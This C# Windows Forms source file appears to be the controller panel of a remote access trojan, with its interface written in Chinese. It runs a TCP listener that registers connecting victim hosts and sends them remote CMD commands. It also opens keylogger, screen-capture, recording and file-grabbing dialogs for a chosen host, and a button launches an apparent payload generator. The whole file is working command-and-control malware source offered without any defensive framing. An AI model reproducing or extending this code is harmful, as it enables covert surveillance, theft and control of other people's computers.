using System;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using System.Net;
using System.Collections;
using System.Runtime.InteropServices;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            Application.EnableVisualStyles();
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        public ArrayList clientdata = new ArrayList();
        public int clientnum = 0;

        [DllImport("winmm.dll")]
        public static extern bool PlaySound(String Filename, int Mod, int Flags);

        public int port; public string raddr;

        public static ManualResetEvent allDone = new ManualResetEvent(false);
        public void Form1_Load(object sender, EventArgs e)
        {
            Thread ListeanThread = new Thread(MainlistenInit);
            ListeanThread.Start(); 
        }

        public void MainlistenInit()
        {
            try
            {
                Textoutlog("测试日志输出");

                label7.Text = "创建监听线程并启动";
                
                IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress ipAddress = IPAddress.Parse(raddr);
                IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);

                Textoutlog("绑定到IP:" + ipAddress.ToString() + "  端口:" + port.ToString());
                label9.Text = ipAddress.ToString() + ":" + port.ToString();

                Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                listener.Bind(localEndPoint);
                listener.Listen(10);

                while (true)
                {
                    allDone.Reset();

                    Textoutlog("正在等待新的连接");
                    listener.BeginAccept(new AsyncCallback(AcceptCallback),listener);

                    allDone.WaitOne();
                }
            }
            catch (Exception e)
            {
                Textoutlog("发生异常!" + e.ToString());
            }
        }
        public void AcceptCallback(IAsyncResult ar)
        {
            allDone.Set();

            Socket listener = (Socket)ar.AsyncState;
            Socket handler = listener.EndAccept(ar);

            StateObject state = new StateObject();
            state.workSocket = handler;
            handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,new AsyncCallback(ReadCallback), state);

        }
        public void ReadCallback(IAsyncResult ar)
        {
            String content = String.Empty;

            StateObject state = (StateObject)ar.AsyncState;
            Socket handler = state.workSocket;

            try
            {
                int bytesRead = handler.EndReceive(ar);

                if (bytesRead > 0)
                {
                    state.sb.Append(Encoding.UTF8.GetString(state.buffer, 0, bytesRead));

                    content = state.sb.ToString();
                    if (content.IndexOf("<EOF>") > -1)
                    {
                        Textoutlog("读取到了" + content.Length.ToString() + "字节，内容 : " + content.ToString() + "   "  + handler.RemoteEndPoint.ToString());

                        Send(handler, content);

                        string sysinfotext = content.ToString().Substring(0,content.Length - 5);
                        Additemtolistbox(handler.RemoteEndPoint.ToString(), sysinfotext, 0.ToString());
                        clientdata.Add(state);
                    }
                    else
                    {
                        handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                        new AsyncCallback(ReadCallback), state);
                    }
                }
            }
            catch
            {
                Textoutlog("一个连接断开了" + "   " + handler.RemoteEndPoint.ToString());
            }
        }
        private void Send(Socket handler, String data)
        {
            byte[] byteData = Encoding.ASCII.GetBytes(data);

            handler.BeginSend(byteData, 0, byteData.Length, 0,
                new AsyncCallback(SendCallback), handler);
        }
        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket handler = (Socket)ar.AsyncState;
  
                int bytesSent = handler.EndSend(ar);
                Textoutlog("Sent "+ bytesSent.ToString() + " bytes to client.");


            }
            catch (Exception e)
            {
                Textoutlog(e.ToString());
            }
        }

        public void Textoutlog(string Message)
        {
            label7.Text = Message;
            richTextBox1.Text =  DateTime.Now.ToLocalTime().ToString() + "       " + Message + "\n" + richTextBox1.Text ;
        }
        public void CheckAllConn()
        {
            while (true)
            {
                int i = 0;
                listView1.Items.Clear();
                Textoutlog("开始检查所有连接");

                foreach (StateObject state in clientdata)
                {
                    try
                    {
                        state.workSocket.Send(Encoding.UTF8.GetBytes("BB"));
                        byte[] bufferback = new byte[4096];
                        state.workSocket.Receive(bufferback);
                        //to-do : 超时检查
                        string commandback = Encoding.UTF8.GetString(bufferback);
                        if (commandback != null)
                        {
                            Textoutlog("第" + i.ToString() + "个连接正常 " + state.workSocket.RemoteEndPoint.ToString());
                            Additemtolistbox(state.workSocket.RemoteEndPoint.ToString(), state.sb.ToString().Substring(0, state.sb.ToString().Length - 5), i.ToString());
                        }
                    }
                    catch
                    {
                        Textoutlog("第" + i.ToString() + "个连接已经断开！" + state.workSocket.RemoteEndPoint.ToString());
                    }

                    i++;
                }

                Textoutlog("检查完成  检测了" + i.ToString() + "个连接");
                break;
            }
        }
        private void button10_Click(object sender, EventArgs e)
        {
            Gernerate gernerate = new Gernerate();
            gernerate.ipaddr = raddr;
            gernerate.conport = port;
            gernerate.Show();
            
        }
        public void Additemtolistbox(string remoteadd , string sysinfo , string num)
        {
            string[][] hostdetail = new string[1][];
            hostdetail[0] = new string[] { remoteadd, sysinfo, num };
            for (int i = 0; i < 1; i++)
            {
                ListViewItem item = new ListViewItem(hostdetail[i]);
                listView1.Items.Add(item);
            }
        }
        public void executecmd()
        {
            try
            {
                Textoutlog("选中主机:" + listView1.SelectedItems[0].SubItems[0].Text + "  编号" + listView1.SelectedItems[0].SubItems[2].Text);
            }
            catch
            {
                Textoutlog("错误!!! 你还没有选中主机！");
                return;
            }

            int selectedhost = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            int i = 0; Socket socket = null;
            Textoutlog("正在寻找选中的主机");
            try
            {
                foreach (StateObject state in clientdata)
                {
                    if (i == selectedhost)
                    {
                        socket = state.workSocket;
                        break;
                    }
                    i++;
                }
            }
            catch
            {
                Textoutlog("没有找到该主机！！！！");
            }

            try
            {
                
                if(checkBox1.CheckState == CheckState.Checked)
                {
                    socket.Send(Encoding.UTF8.GetBytes("a"+ textBox1.Text));
                    byte[] bufferback = new byte[40960];
                    socket.Receive(bufferback);
                    Textoutlog("对应主机已经找到，发送了指令并已经执行" + socket.RemoteEndPoint.ToString());
                }
                else
                {
                    socket.Send(Encoding.UTF8.GetBytes("c" + textBox1.Text));
                    Textoutlog("对应主机已经找到，发送了指令并等待回复" + socket.RemoteEndPoint.ToString());

                    string commandback = string.Empty;

                    while (true)
                    {
                        byte[] bufferback = new byte[4096];
                        socket.Receive(bufferback);
                        commandback = commandback + Encoding.UTF8.GetString(bufferback);

                        if (Encoding.UTF8.GetString(bufferback).IndexOf("<EOF>") > -1) break;

                    }
                    Textoutlog("收到回复!" + commandback + socket.RemoteEndPoint.ToString());
                    if(commandback.ToString() != null) MessageBox.Show(commandback, "CMD命令执行结果", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch
            {
                Textoutlog("发现异常！选中的主机可能已经掉线,请刷新主机列表");
            }
        }
        public void keyloger()
        {
            String content = String.Empty;
            try
            {
                Textoutlog("选中主机:" + listView1.SelectedItems[0].SubItems[0].Text + "  编号" + listView1.SelectedItems[0].SubItems[2].Text);
            }
            catch
            {
                Textoutlog("错误!!! 你还没有选中主机！");
                return;
            }

            string hostinfo = null; ; string ipadd = null;
            int selectedhost = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            int i = 0; Socket socket = null;
            Textoutlog("正在寻找选中的主机");
            try
            {
                foreach (StateObject state in clientdata)
                {
                    if (i == selectedhost)
                    {
                        ipadd = state.workSocket.RemoteEndPoint.ToString();
                        hostinfo = state.sb.ToString();
                        socket = state.workSocket;
                        break;
                    }
                    i++;
                }
            }
            catch
            {
                Textoutlog("没有找到该主机！！！！");
            }

            KeyboardLog keyboardLog = new KeyboardLog();
            keyboardLog.socks = socket;
            keyboardLog.raddr = ipadd;
            keyboardLog.ShowDialog();
        }
        public void GetimageScreen()
        {
            String content = String.Empty;
            try
            {
                Textoutlog("选中主机:" + listView1.SelectedItems[0].SubItems[0].Text + "  编号" + listView1.SelectedItems[0].SubItems[2].Text);
            }
            catch
            {
                Textoutlog("错误!!! 你还没有选中主机！");
                return;
            }

            string hostinfo = null;  ;string ipadd = null;
            int selectedhost = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            int i = 0; Socket socket = null;
            Textoutlog("正在寻找选中的主机");
            try
            {
                foreach (StateObject state in clientdata)
                {
                    if (i == selectedhost)
                    {
                        ipadd = state.workSocket.RemoteEndPoint.ToString();
                        hostinfo = state.sb.ToString();
                        socket = state.workSocket;
                        break;
                    }
                    i++;
                }
            }
            catch
            {
                Textoutlog("没有找到该主机！！！！");
            }

            Form2 form = new Form2();
            form.socks = socket;
            form.ipaddr = ipadd;
            form.hostinfo = hostinfo;
            form.ShowDialog();
        }
        public void button6_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(CheckAllConn);
            thread.Start();
        } 
        private void button9_Click(object sender, EventArgs e)
        {
            about about = new about();
            about.Show();
        } 
        private void button8_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != null)
            {
                Thread thread = new Thread(executecmd);
                thread.Start();
            }
            else MessageBox.Show("请输入CMD指令", "错误！", MessageBoxButtons.OK, MessageBoxIcon.Error);
            
        }
        private void button4_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(GetimageScreen);
            thread.Start();
        }
        private void button7_Click(object sender, EventArgs e)
        {
            GC.Collect(); 
        }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            String content = String.Empty;
            try
            {
                Textoutlog("选中主机:" + listView1.SelectedItems[0].SubItems[0].Text + "  编号" + listView1.SelectedItems[0].SubItems[2].Text);
            }
            catch
            {
                Textoutlog("错误!!! 你还没有选中主机！");
                return;
            }

            string hostinfo = null; ; string ipadd = null;
            int selectedhost = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            int i = 0; Socket socket = null;
            Textoutlog("正在寻找选中的主机");
            try
            {
                foreach (StateObject state in clientdata)
                {
                    if (i == selectedhost)
                    {
                        ipadd = state.workSocket.RemoteEndPoint.ToString();
                        hostinfo = state.sb.ToString();
                        socket = state.workSocket;
                        break;
                    }
                    i++;
                }
            }
            catch
            {
                Textoutlog("没有找到该主机！！！！");
            }

            AdvanceFunction advanceFunction = new AdvanceFunction();
            advanceFunction.socks = socket;
            advanceFunction.ShowDialog();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(keyloger);
            thread.Start();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            String content = String.Empty;
            try
            {
                Textoutlog("选中主机:" + listView1.SelectedItems[0].SubItems[0].Text + "  编号" + listView1.SelectedItems[0].SubItems[2].Text);
            }
            catch
            {
                Textoutlog("错误!!! 你还没有选中主机！");
                return;
            }

            string hostinfo = null; ; string ipadd = null;
            int selectedhost = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            int i = 0; Socket socket = null;
            Textoutlog("正在寻找选中的主机");
            try
            {
                foreach (StateObject state in clientdata)
                {
                    if (i == selectedhost)
                    {
                        ipadd = state.workSocket.RemoteEndPoint.ToString();
                        hostinfo = state.sb.ToString();
                        socket = state.workSocket;
                        break;
                    }
                    i++;
                }
            }
            catch
            {
                Textoutlog("没有找到该主机！！！！");
            }

            Record record = new Record();
            record.socks = socket;
            record.ipaddr = ipadd;
            record.ShowDialog();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            String content = String.Empty;
            try
            {
                Textoutlog("选中主机:" + listView1.SelectedItems[0].SubItems[0].Text + "  编号" + listView1.SelectedItems[0].SubItems[2].Text);
            }
            catch
            {
                Textoutlog("错误!!! 你还没有选中主机！");
                return;
            }

            string hostinfo = null; ; string ipadd = null;
            int selectedhost = int.Parse(listView1.SelectedItems[0].SubItems[2].Text);
            int i = 0; Socket socket = null;
            Textoutlog("正在寻找选中的主机");
            try
            {
                foreach (StateObject state in clientdata)
                {
                    if (i == selectedhost)
                    {
                        ipadd = state.workSocket.RemoteEndPoint.ToString();
                        hostinfo = state.sb.ToString();
                        socket = state.workSocket;
                        break;
                    }
                    i++;
                }
            }
            catch
            {
                Textoutlog("没有找到该主机！！！！");
            }

            Gotfile gotfile = new Gotfile();
            gotfile.socks = socket;
            gotfile.ipaddr = ipadd;
            gotfile.ShowDialog();
        }
    }

    public class StateObject
    {
        public const int BufferSize = 4096;
        public byte[] buffer = new byte[BufferSize];
        public StringBuilder sb = new StringBuilder();
        public Socket workSocket = null;
    }
}
